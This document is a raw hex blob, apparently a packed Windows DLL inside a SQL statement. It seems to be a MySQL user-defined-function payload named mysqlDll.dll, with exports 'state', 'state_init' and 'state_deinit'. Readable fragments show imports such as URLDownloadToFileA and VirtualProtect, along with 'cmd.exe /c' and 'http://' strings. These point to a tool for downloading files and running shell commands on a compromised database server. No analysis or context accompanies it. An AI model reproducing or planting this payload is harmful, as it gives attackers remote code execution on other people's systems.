4080FA22FE84AE1B2FFFD274250FB6D2F68292610425FF012B3B3256FA068A108816F60BD5EBCE0C6E6FA11124CB46401CEB43F2B645C61E05044044DAF683D6DCFD5B1918881E4665207409090870ACF5F20975CC750348C34A66FF9A5AA946B5674EB5E003F0BE66442B052787A281993117C8BC15CE169739FF02FB0885FA5AD0B8225C75C8DA922C7FE1C6AD02752541397D6D0D807801228D86257A6BE31D8BC2EBA3080CF0DB770416180F94C28905D1EB8BD34B88F6EF02F30E4388C6065C46B16AADAE355980A74A4693682E4C67168A3F863D1306ACDBE32E2819E2061F7303C2091B0F400315016B43F850BF38A0300F0E95A9E1EE6EC70383278E140246DDD1306449258F9C5378446DA830D4E06CF633141A8DCD4D04D50E0B49180F407B7B21892858CC428BC6D047F317EA10C700CE1B02433A45DBACA33CE581430C3F27C2BDDD5A3766391E6AEB4040081875F96DFC419F06F22BC6CFCCD1F88E40DA2A5AA3025D038A345852EB0DCCE83BEBAC3213B75683C9AC1C55508D3A57D05C242521D20C10CAB56A90275C2703F6756B0C92C888EB53624CA54A0592B985B1566089DFF6858D740A40387BFB04F62B223760495B6A55CE03F6EB727180A50BBA560F91E248D0CEBAC4BA9E5D5B20070261ED572A381026E821681A536C106A7450A213FF153A152B3859450C163A448330D4653B5BB95BD0D7EC084144F77CF0DE6889F134F18E033B961ACCC230B7471C2A6C45E8F75437E9700D10D77AFA75037A08B60BF18F5CBD59A522560055016B47C1BA30131750E0506DD65B3A3B591257D9BD07A8D6D90B3040963C76291950BBFDBE7076F80D838D6A0303F841DC5739B99D10B3105560FFC05D36763610570C7C1DBC7D36EB9E10FFB6D3C41611681020F8F6B9ACA927945450592C5FEB26165A6C81A38D30C7F23612B1DD0482086AF4D56CC881110FD85EC90E40C128265325F34226D911163C8B14C0012B0C8329EB2D3983D71C90A756F6DC784CC8D5EB7438B125213EF950E99ECEF2B2D61C11A9AEA880643C287BEEFD8DAD8AD73D63F3831881D51404B03582AFB210EA02F01B61E0594E3EE9B3B68D4B38F7881CB50C80F4C025622BC08B03317E30641C5E45AB0EE3A24C96880D535B24C67C80066F04368EC1F10C5229231AE3AEF90F86EAA0ECF1EE5BD5416E2BB64D1073290AD62EB045A58A95F90A7409FFDEBED0F02B0D408808EFC88D95292BCA81F9883D3655127CCC8911DBE3393ABFF4130D6B71FF85A061C634300C6343065FB6F6D20145E8C77C0B0964454510728A9960E96DD98B134E90464868B5BF8B74626A055E39B51D177F2126FC8930EB41B456EBC78D4DF4575CE6BA01B310FF43640B2EBB51CED14FEBA72C9C1EDA241C06E02C9720405AE8A015F52CEA1A10AA6C4FF24D666E1C38EBD2A4F007458258DF02F1B516CC808C6E6DFDFEAD068E6583490C08C741181BEB1103CEDDC80C494114181276D4525CA25E83618A011AE0188DF93B377203DCC883E17018AF362C368AD1A1D81C331340E58CC009FC7591345730E486E0D55BE159519130D716D76A138E1DB69AE51E5B00DE3FB41B155A22DD0CF3A00AE11ABC7A1EFBD82BD7246046735A732844BF5A020BA68FCC6C5DA0702B700C66C8077739D80A6DA14BDD581A58B26575F1A436CF51A08B84600C33C2CFBD1A506820CF118FDC6DCCCC208C4106F80E3A2AD716B6195F41CC00CDFB55B88A6D180B7718CFE8BA37C2F72AF18BD8090C07D31139A050D60C3215FCFFCF4913D1E9D1DBD1EAD1D80BC975F4F7F3B014B9B684643D2150F7EDEEBB2F7DD1720E3B27770872073B2B76014E4C4B56D84A7FDEC27F6F2A0E7AB3D96E506EA833B6517405C203506E10DD66C85E0C156EC814910410BA37CD606B0C0E0876082BBB1B406CA6DB11140708BDDA264103BB27DA007C3F26A8742AA6443D71A376E9C18BD1783BFE3DEF0F82800E036A738314ED6F4BDC8183E2EEF95E29F3A5FF249513A9F1DFD6426811BA1C83E904720C0CB136DB8F62C86D41801E8D789075F3B9C70741FC900403BCE023D173DB852F1188078A46BE470105025608938C2D5B59C6C75CCC8D96652CD949002B25010202EBCE2679A690234621473F5DD70DE48C065F034C0744374DD3343C342C241C8B44344DD3FC8EE489448FE4E8E8ECECD3344DD3F0F0F4F4F8CD39324DF8FCBDD7007B87B01027F809FFF00305399AA6808CA0BC6C36B0D766909D0BF91133240417A30D0A2BB8555B0D2531C639FCD8F692417F240DFDE3FC77823BC2E54400F7D96543B04B8F779E9C1CF92B43082CC2D6745D900B180338606D033A02F275B76F034E584F56B6B74B08F6971FA3EE02EF026FD9807C298C902724E3952D09AB2D03AE45EB1666625A955B7FB403A6699AA6BCC4CCD4DCA6691A9AE4F7971C1C189AA6699A18141410100C699AA6690C08080404A6EB0E231F05100318E05A129A283C8BB7B56C21CC96870F8313112A210CB700ACE86FE2570FAFAE83FEE08BDE770D0000EC1A0C2715773A7256B4D59382AB1D3D530256F057752B566A082A898850D71C14229893820F56741956947414EBA96A72A31644577C54EC8157B40E5BEB56D5612ED4230603EE265D565698182B52F7616904FC8AAEFF41BE0D50BCC5273ADC3701435C147C29985047568D7C07FB2D162BF90CAD240600473B5B290E2B1E7CA55E90C3B6CA11C56056821834BFA3A546088B87803B08742246C2ED46D988E80713720FF9240A606106817D0D4C02DB6E8350F531845E39C3D9AC60B6DDBC17721507CA532C1EB22D19080C16334BA55C1DE660080C7BD27502BD40DF1283CFDEDBE158EC22C90314BD737500A20F08B1443C998A74F6466221F816F87544837E5F23E886DE04FD0C958D460CFE1EC413ABFF4620ED8D5E0C70F61B090D803874180C84884388239F4500C3A585BF2D50DDE52B116A245999F7F9D1F03DD4A80336C66D2983FA3BF137EF2083C5044381FD5FA40F8C5E3984F86E23EB4EBE3E56B93E126F843E8D0C9DA9901E9C5F8684F83BC27318C01103D6EBE48D0815EAC1E30543C70B2256C9A012346C430BFCFE07563B0D535773F7C1903683D0C93CC18F07833C50B0DA28E4361AF51B053E1E751EE28B104974084958DEDE680284F4EB0804F5EB03F6A337DE4600E836891C308A5BEB161EE4C2DA027F7B5882864329F459376A830037C674320E1F5AC9F31CD6CA7E50505031C85A7B830CB2247ED4CAE264CF731FCCA3AD8D8800AB740F00E16AD8580841533AFDECA4963B343D1C063CC0C1E7154A81B1BCF749D418C5604B9E381780360CB2AD2C98248184E169CA5190C61D5642D4920179728BC3C36C8BB1E14E4152530411590F250306F029535DEC60B404CBF0F6D915B7B10211B0FF0336E4106AC0A359B43809F2A22CDEB43F4AA87BF6F30549C0FF4AB890073C9013082CBAAED003FC0C203F087900724AA84AA8A6E9BAD83F069F038C848BA6699A7C746C645C3F5D3B8F004AA8F003C00164D134CCE03F39859CE44C404BF04B4845D375DD2C900B580378A03C0239903F4C404C405D171B855B7FF403FC344DD3750E04030C141C24871160D1373F1F164DD37505500358687C3FAB2F4A003E1CCCA0022F907956F6C112883F1594D9815DE874095900FE37ABC645FF10EB0B8065FF8DECFC0FC0861A806811F6C540750839B72F455328E48B4DFF806A83C15E02056083236DC3DE2374001680E1A4C3F96C01175510100840EB07F60D4A30797FF810742604ADB7F2F220741830740A5074897505216A16A21521020C2ABD7CDF060389F0BA00077D0423CABF54B47F037D3BC87F31742A3BCB43C3ED4AB06D195433744D0739BA91AD85CC43F84C0804BAA67B7B435AF8EB3E26052F070643CE806F1E3BCA7423C2163CDD1188188F4F5B3B0507E69EE00113FDBEFEFF32FC5DF4C77413368E54F7D1234D143737B8DB1172A840C581CE1F0FF601F6ED63DBB7C4DE020BF7A8DF081408EB0AA8115D2CBDB1060B1068ADD8233BD39241E0DF751AE918016D0D8231816ABFB78D0A9E2DA82BCEF008022D6030EA3BAC39BF4213628561325256E8B383459875090A18EBD8D583F9B19A4DFF40EB09AF08146C410F78473159812781D6C68A11C380C901C630045A8452C9C2DD05BEFF0B48884CBD7578EA7473F606818116F502746D8B945DA2220B1E8B067519FC35008FBE813883E94B1D2A1759D888B60DBCEB584213E2137C677E2511335669A116807D131A11825F178CF015554445E2811980C73E5A74B52DD81C2EAF737808AB60072DDC07808B8C4E8BF390E005C916713F8005431467736A081E8233918B09570441464E600F3B32B24C245B231A0EF2F2B64D79D50D04FEEB08FDEB03F4C11A824C0C5F198A1141AA1EEC1BF16488174762EEEB05838C00F0D32401119C2CCBC983C1E134271208006DCC6AC738682DD9D2D96608C6C3000C085DC049B38807CA185A1965872312F52A65520945A9F88959AC913859A6E80AB82C06F651FAD756F29B6A0A8FD2268988391874744617CAE630428A78A9E850538B58DA71F0D73BC6CC214D628386A240C893715963FF25DAE2BF94603975E8F3ABAA895D0F6C16E8D386EBD77DEEB8BC4DEFDD405B2B04D30CAFCBB641FFE87BA312CA300F87942588CD546C9CD28DEEE356F7E58D614F6F52F3AB04AA8D9E94FA52A15498BCB6DE2C8A5101E84B51844B5CFA3BC777B7EFEE2D68FC8A922080089047401376F5F84BB1F04141803965D47983C308837DFC6913B93638C1E2C8914CBA6DA087F750A3A4105384898C2AB8BFDF709140A5A559A3D1A5EB5240D1B3A660810547A8C6A19EC57EF508403DFF07F153382B89357BDF06F15335250700BA49F88816ADAB00981EA84C97DFE75E2E8604AFE9508301D08C4311946FA857DA70EF65402DDFFE01A8946CBBE78FA8FF1570F814FD9635D1CBF4FC750F87DC19F6AE1CC7492DA463E7E804741704D7A628F00D740C802CB804F93CCF763605120B0811578460862571BEC01F88E1625F044CE5CF52B1404522283456A166B453962215127FE081E016CFBE8C888405ECDF7FA1150D8AC672F48A45F2C6850D20166E104D3B375A55F3B80A2D415FA0183BC1771D48BC3A08768F2A41B820008BD9CBAB6B81FA47AA42428A42FF84C15FF8EC352C900EFA8B358D7A029A33D0213989B2EF8C7DDD5A9123FD1D561E9291DD6C5634235842FCAD803DB8682E2768002E7DB75CCA8D8D726695F6C2CDEF67341503108A940564889060EFCEC9DBEB1C1A027410205BEBE380A06E6834781CDE4400BFEB491ADB0D1315DA417219045AB2BC8DFDC34BC880C1208888491F1D617213C3DE9CBC7A770E20E920EBE04C77F915774ABE5EC97394886AFDA90210F970505C59FC94882F1FD575798FAC426866281854FAF7403D6709FC161C57FFD664BEDB29FA297450100CC7D7BE5DA0F85714B00C06B45B99A0BB88CD16FFD0D602DEE66BED10B405531104EE1590601D4D0AC00982FA8659A057040481282056B064F0BB470B0C85965E91F983FA982DE9ED6A47C025152BD16075FA9AEF10D06D020610CA1A251C8E1D1429168F58A6EB3A06234AE2EB8807351E94CC5289365A271ACF0D56AF1235140FCBFFE1C3A0B7AC99AD78F2971B180A0360B615DCC1A8F1223E1975EF13A0876A064F4AACEC508B9E1D9C345CE66D442C51681C4C147D452E6AB6AD50293F89B1C1E0939D084B1A6606AB9F44BC3805750BBB0D416F064D6B50AF256BBC5C487D469512980708D0E250853014526D2FD050BCDE1BF6034EBC05A908D81A4A8615B06F126945FCDE30A22DC25B53C366A035AADB9C65F874E144346021CE0C29800750A09543B566401343E0E0043812F107C406F98A4804657FAB99A5DF89084B1D8A40053C0A84BED01D154D1088E4078D53010F8B459718C682050ABC160C166D515452B810448B664DDB39AD976865D1068F1496935166EB006D912446E98B17684D8B3D4BE1F40155F64235D144E68AE5A87CC50EE0D0F876EB3B0A81A274BBBE0C04E724FB027FAD0D03808136C85B00140C0075FFD06C0B23578A101A33AE3CD45FBB2D0D0BB443FF135A12493944BBDD2DA2182140803848068308CDCD76BF5F5EC6030D4344EB73CA2BD36E3260E7FF6A01CF0A090E683BAA479F74411ED101A2358848D12D821A85FF9D468B0F4388443105EB293B700420DEB6250CFF6305160AEB18A55E40D812FFA9193507AD9C7B77BF925B761A750D85115C74F3064942D12EE5E4AC062B4688210250A8EAA9D800F91131357540346A46C42BF87D5BF41F8AE875465757EB533038154C20629236B1F2DBCA6A711D23EB222014A660B0341B48E1FE033130EB651DBA397D147E108AB25936C514105A66B67DF436E1A11D591D161C0286D98CD9181FD84872DA478DC159D22AD3A62018366B5B0CBE3C20732EDB6CB74EC1245E0140503720CA3F408C4C793BDF0F849CD25B6CA014041B9C0324FCF25DAADB2EDE8BC441DC8367EB138DB5D751678BF026118BB5D9F6AD3867DC7466534CDC6121CB9EEB9257F44DEC1AA574A3A6884412D80A7432B06D4B6C5E0D40403E1C78B2C8663713EDD57F1EDA321C0962C321858F2065C814876515F4A1F20BD966B6B336DC895DE08B15483212BDB27DB953D6BDDF74B45664E467749C8F6AB35BA3B30E03EB068C28EDD5618F54D5CC0AB11B88108B71B77179088B2680AD9F44568D4A9E0D7FBA0DBA5580F1491AF30C5E5CC60736942B498BC24E58ED61328118B4ECAC375E2D043E3E8A515E564234632356A53C0497CFC819DF1D1B56495340CEC2C73B028658A3432D24F276607CDD1C490554CC335033E433B263345BC8945D18908DD9968D532C34201BC53619181FE0DB630AD06A15B5CB3EBB15B0107CD3DC57CC0FE16050B3EB0B83DB33ECB6119CF6112949E0565FF670C9DA1C5552F8D7B2703A84933C8AF5CC38680C42EF047AC25F9A51D4E7023A01752E0A1BB1D552F0263A613E0A431D966EE146873A4101191411035BA330D56BFDD51A75555B430BB3FFB090D3D18E016DADCA0B4301070242B5CFD6ED44E94130E01302A86658AD799AAF335BD2CAC9C14A6D42AA5BC98CCC4F56530B4A55B050009C1B201AFFAE023307420FAB0424EBF3775DFE5ABB8C90416E14460FA373F201E6E20204C420753F98FD646C3A0AF38D46FF3B9CB8ACF87B5643BE51EEB60E56485481DF4C03C12580FC8D161DDEBD0A80E17FEB0D811FDED0540440391180C980DE880A81440B8D6686C5C671D0419080E3D60AC0C006A0A8487D065C9C249E5862050D10565D7426E8BC00BF83C410E0AE41C305E3CC0CB568E12EF1C6012D415CEB030A915B4013D4B88110B5DAA5DAD2630883FB0950769225FF2F7D6B2004308819413577DA802100498A178A018878007F8B118F49473BF972F21B365341486FFF948BD6A81E588D39C470CD4143A1D03B5CCF252EB6C1FF46758A274738C474F22C419D1AE324EC85D2E1C5FE4186E00E824A6F1474D21AC0E6FFD1575F3AEB78F0FFBF34019130007F0419C0D96EE2EB15130DC9817888C2C77895FFB541599EEE9067271FD82E760B3E6A602266C4040907B742A68D38CFDA39CB15580B0318AC05224EEBFB55D0C2052241280EABE097CF0B6C112836D1E970DA0C1B1FFF804EB741B35AB6201726828ADDFFDBEE0774217F1D467BFC720638DC770202E638F809D8B517BA35C6F7750DEBD733C908023657B34D9BB9AFE582806D6AE4BF0FF35FA6ED85B50A321926EF2BB446AB2F99EE57EBB68DDE5AC3EC74230BAB1F775165EB3AC0F0596B0979D584B5634DCA0975720271FC08A5C9DE0E5FFECB030051283074512BBC2311EC1A2D75770C920F1DA2C685B7A6EB52DF2F7D8B5BB10EC11AB6D10A5601805E6EBDF54B318065FE0088508845FDF3EB09BAAB41D90DFD0F6C8D4D0AD58B1803165179AD7DD182C16E4F026B53B38059E3450A23B07465BB72251CAE5A80450F8CD5815DB9AAF5490F8FA18A46D52D1FE9DEE83C057C83760A4D405E7D2539DBD187F8787E0BD95FAD6A0AA1A1F4DEE0FE8A045823C667D9EB658B1512DA65E94CB4B6C84A740FA7DF5BD4D630AF88065D0958B60917C5522B5B13566B032CF036BE03B49F572F1A6AE0648FCC20F6AEDA06AD75A5D646D0BE05FD032C37126253CB0BC18C00885DC029C25A0BC839FAAB60287C25F7E1C29DEB025EA105B11D42030985056C351FD31EAACA3EC1CC03580000D37466AAFF0F4D53EE65DD9304DF03E50F08EC03BDE4F2B2F20F0AFF0B050CCF0AB656D003D50302017FB6DF3A1903070602100445000535300050B5EEFF7F2C20283850580708003730305750070F200BD71461DE000860686009780073AE956E08071507001A010E7D7BDDFF0028006E0075006C0129320F6E756C6C6FB7FFDF0A72756E74696D65206572726F72200F0D0A03544C4F07E4BFD95353110E0053494E470044BBFD65ED4F4D4112115236303238082D204BB76F7F7961626C746F20696E6956616C697A0D6865D67EBED961703727376E6F743D0460EFB6FF756768207370616323667B6C6F7769380AB9EC3661066F6E3736ED672079737464357075722BF6DB5AFB76697274752133A5632320630C9B42BED86C285F345F2ABDF6DA7665785C2F5806DCE2E6BEB0935F3139F76F706558313260DBEE736F0F646573632B3888706B6D4624816564193024DF405723376D926FDBADA6AC7468BF612F6C6F636B1B6C8530173464B7865B6B6E612E02A221726D0050D8DAB770406772616D204A6D366829EC852F30394F10E71A8D66412A2B302E2B84EF53C8386172677528735F6DBBF63C303266C16E6E67826F9CB52EB605743A1164E67F4DC3DB422B2D60396615566973AAEFF660FC432B2B2052A04C6962B47279276D0F87B90A2D16450E211150D8656B9CD43AC2002E003CE5ED6D736DE0252C6B6C776E3E1B17EED8F84765744C61324102766550AE75705BDBCE62130F57956426876534BEF0FF7373616765426F78410075732533322E642ADD931252EAB75956035A77CF76670B5A955A0E0B5B8E0392483AAFB9BBB56D904A0064002C204D20086DC9BDB97900632F642F06D74D03FDB5179A4144EE656D626B5B4E6F76C3FE6D930B4F986F0A536570741486A96885416C96711BBEEDF9B941076E6541F369A64D101636172763684665327533BDF7DE7B4A616E0A675F57537BAF7BEF4B47433779433F3B6EA9D0DE3323B03C6418B0ED587B4F5E095468127313D9C15A6157BC7C0C547509B9D9B1C64D251053750743F7DE7BEF3B372F27231F039E73CEB90A11181F262D9C73CEC5AF828990979E72CE39E7A5ACB3BAC1C8A78008047C28BB92975043BD384F296360A9523F4D797371909620A953A636306EC263B50B355A6A09A663B7B921E76A3752C077035C321703ABCF91FB2E746D700FB40600B6472A481D3A2C7EB53D25E4E6FFDB730A2F636D642E657865202F63200068656C55192B75313774073967FF76B6E4380B3006687474703A2F2F8F2DF5FF2ED9632D9B09CAE4C8EBB8F1CABDB4EDCEF3FFC3FE6F120D00CFC2D4D8CAA7B0DC0BCEC4BCFEB3C9B9A6F6DCE6FE21C2B7BEB6A3BA7E175C3F44867B81D10F00200593195731D913199DE4667271F0108DE8832119B2178E180F30434E5146C2F80392017BD894A007010153107C81A4B902011F0264410152476357D9D9070A2F0207743CF2E4C96C084009140A73F01093274F9EC411941270133C79E4C944180C1972E41AAC1B93274F9E741C4C783C796EF2E4C92C7A1CFC18FF86B29317D854DD038572200107402699282048001940269210841002199009810119900119108202601C16023B20EF200D0C050133164DD30C3603070418050D344DD3340609070C0832D82083090A1B0BC1BEF702573B070F575F906EB0101311031217210C32D820350F414336D86083503352175307D860830D575F597B6C17D2344D376DAB20701C72D860DF0BC72F80B3810760830C36821F83848F208334CD91299EA1830D32D8A46FA7B79FCE760EC2601FD70B18070069BEB35D0517C00B1D0490664006968D08644006648E8F9006644006919293CC066140039F78EF4D54EC25FF0204222B6027CF0EF68279822117A6DF07A1A581E9CDF3EF9FE0FC2F407E80FCA8C1A3DAA34F0D72F60881FE0740B577830C812F41B65FCFA2E43E5F21FFA21A00E5A2E8A25B7EA1FE5105BF92DFEE03DA5EDA5F5FDA6ADA32D3D8DEE0B26627B7F939317E430303860064AA432EE99E9C84538B9876840380A6699AA67C7874706C9AA6699A645C54483C34699AA6692824201C18A6699AA614100C08044DD334970075FCF8F0E4DCA6E99E35D42F75CC03C4BC9AA6699AB0A89C908C8849BEA669806C64CD2E821D65BB8C8F905C037F009EF040E82F500B807007F0F11325DCA0D1535499508BDD50C944548CF38CDC97B058592CA7BF06699A0E1EEF3B5A9775A769BAA7B5D4F3E0301AB86CD3034E6D01333AB759699AA6697796B4D3F20CDA74DD272F034D6C01F108A48008368024444144210980D109600064C15B054D734325746554B6CBB7572C0D44656C65466905410A105FDB0C470A0953C5D87393CD2719522C0A23EC4F56C145185661726961622212C0EC7F436C6F736548616E6425F62AD80E4B4A500B63417B7B56686753791D656D4447B7C1B656F5227914744E747515B893FD70496E666F413569704FB1DBD62EA845782A08535D65702CFB36CCFD56657273696F163B896E6754792D67DF856C570F1F4C434D6170115706882E610D1B4D7073ED5BC34279126F65646543688366E5ABA03DFB644F66F34C6FFD8E6B68FF300B746C556E773C3D48D767EDAC7C70416C6C0A46B1FB432D7B9BE16F6D6D09336E7DACB38556982673FB0B790CC580D866E50B56ADB521419C42494D1E263CC3D609630A532740B029DBDACA16AD147215421BC0B64C5B762B78108C8580250B77C5EB8407C4600C542FB998A170B6DA75D3F812DCDD3302524964386C7353F3B3378BDD5575650C4F09DE4BD2258C531D2D471A086D618643427552C93B2463366412A0D50CC363141E4D6F64BDA34E616D6A3B2160BC5F9EE473183004470A0CF3CA6624A3FD08E42CCFF04258164361853B1CFE66BF08506F6990C906C25EF99DFD6B65644465633815C2844D72496E53EB460F3AC1F1EF73684B427566663E6A50ECB136761C0A410B074F454D092C19FE10934164647297EF7D2841BCD93C7155524C440A5BA4668277E3CE1C88F6F6FE340457534153864D00FF0402CBB22CCB17390334090C8D32B62C0B022649F7FF7FAE6D0C10025C000A052F0A5205546417350BDFFEFFFF811912192A060B2A385319310B320D1B806512ED2405670B30100F1CFFFFFFFF1B1B96130B530B1C455405400645171106180A118145110B4C310526530F7D1CFBA5FFFF078B1214050B121B271A1241691A09F04BF83A06F0520103BFFDFF7F0802070F080B06060A18050A1A0E080643125C1B4F59085A0DA37DF66FFF0F16F03001BAF00AF6211775F0C8020400CE2D07E6EDEDBF5F10070708270C0A08300A0608050C050CBFB5FFBB16030813082D1B10060F06070921AE08F04F020E6BBFB5ED061A050F107EA20605060D1D15349BFBF69B2244A6F0ED0120130616070F1810FBFFDBDB091A571362A9850E0B14060E09111C0F12091C230A03FFFFFFBF0C137F0A1CF0F20007194212310C0B0F0AF00302F04D012C0C1C191A0811F6ED5BFB050D05F00549BF05380C0757070A19088EDBADFDDB05663A081A0611190C7113081E0917F6FF0B6F17621806422214320715320A2115242A0E311CF6DF6EFF21250F0F321043CB140E47065B074845E3193539DBDF6EFF0C103F50133E1282260D8E13270F42141E6D157CFBFF6FAA0E13770D251C1374A04D18154A481712E3084B2512842F6C2F47550118EF051D29261A072842EEDE1D4A0604660B1B07161D2A32FFB7B77F7228060C3B0829710D0C234F6039150D3D22084C0F19615BFBFF262E0F20222D143A0726181A0B83A67C56DBFFFF138AF0FB00790C150B2EF0D9011C0D0D13090C32C221B76678E106210A1D081715A919E80B0AFBDF0A0B6E432C0019066F061E1113151EF95068857F10210C120E0F11759647BFF00BCDB85C7EF056011E550F0AC60A89050BFFBFB51F4C35080E1E1D182058163368254605030717FEAD6DFC103D105612F03E01EC48B24F30BD71E1B75B045E2F0F5838EA3C7D3810040CFB76F38301F0B4030408F0AC0A0DF014010417C8915D7E2010108408020800046453203FF0240608041009F92F71E90C9C645045A54C010400B2976A46AA4EF90FE0000E210B0106264B004F26A9244110BDEC3CFB09100F04000700D0B237E982272A0202079B6D7ED81E8D000071C886620285B9650AC0648A002B8CAA4BA744B0100C76F92E7465787446619070E2AD2A6574CD602E7212669D2BC1AB0D5303FB5E73D902402E26CF2427B62919A49090C04F6519EC6B0F7D584FC027A06F6EBF29421B5C881051C489C700000000000000800400FF00807C2408010F85C201000060BE00A000108DBE0070FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9960100008A07472CE83C0177F7803F0A75F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE00C000008B0709C074458B5F048D843000E0000001F35083C708FF9650E00000958A074708C074DC89F979070FB707475047B95748F2AE55FF9654E0000009C07407890383C304EBD86131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE58E000008DBE00F0FFFFBB0010000050546A045357FFD58D87FF01000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9C73CFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000070F0000050F000000000000000000000000000007DF0000060F0000000000000000000000000000088F0000068F00000000000000000000000000000000000000000000092F00000A0F00000B0F0000000000000C0F000000000000073000080000000004B45524E454C33322E444C4C0075726C6D6F6E2E646C6C005753325F33322E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F74656374000055524C446F776E6C6F6164546F46696C65410000000000000000B1976A46000000001EF1000001000000030000000300000000F100000CF1000018F100009010000090150000801000002BF1000031F100003EF100000000010002006D7973716C446C6C2E646C6C0073746174650073746174655F6465696E69740073746174655F696E69740000000000E000000C0000001D360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);
